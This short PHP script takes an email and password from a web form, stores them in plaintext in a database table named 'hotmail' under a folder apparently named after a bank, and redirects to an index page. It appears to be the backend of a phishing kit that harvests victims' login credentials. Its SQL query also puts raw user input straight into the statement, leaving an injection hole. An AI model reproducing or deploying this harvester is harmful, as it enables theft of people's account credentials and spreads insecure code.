<?php 
require "../banitsmo/conexion.php";
$correo = $_POST['correo'];
$pass = $_POST['pass'];
$consulta = $pdo->prepare("INSERT INTO `hotmail` (`id`, `correo`, `pass`) VALUES (NULL, '$correo', '$pass')");
$consulta -> execute();
header("location:index.php");
